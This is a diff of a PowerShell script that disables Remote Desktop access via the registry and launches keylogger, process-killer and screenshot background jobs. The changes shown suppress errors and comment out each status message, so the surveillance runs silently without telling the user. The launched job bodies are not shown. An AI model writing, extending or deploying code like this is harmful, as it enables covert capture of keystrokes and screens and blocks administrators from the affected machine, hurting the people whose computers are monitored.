@@ -1,6 +1,6 @@
 function Disable-RemoteConnections { 
     try {
-        Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value 1 
+        Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value 1 -ErrorAction SilentlyContinue
     }
     catch { Write-Host "[-] low integrity level of runtime process! (try to run As Administrator...)" -ForegroundColor Red }
 }
@@ -241,16 +241,16 @@ function Get-ScreenShot
 
 #try {
 
-Write-Host "[+] Disabling remote connections to this host..." -ForegroundColor Green
+#Write-Host "[+] Disabling remote connections to this host..." -ForegroundColor Green
 Disable-RemoteConnections
 
-Write-Host "[+] Starting keylogger..." -ForegroundColor Green
+#Write-Host "[+] Starting keylogger..." -ForegroundColor Green
 $Keylogging = Start-Job $KeyLoggerScript
 
-Write-Host "[+] Starting process killer..." -ForegroundColor Green
+#Write-Host "[+] Starting process killer..." -ForegroundColor Green
 $ProcessKiller = Start-Job $ProcessKillerScript
 
-Write-Host "[+] Starting screenshot automation..." -ForegroundColor Green
+#Write-Host "[+] Starting screenshot automation..." -ForegroundColor Green
 $Screenshotter = Start-Job $ScreenshotScript
 
 <#while ($true) { Start-Sleep -Seconds 30 }
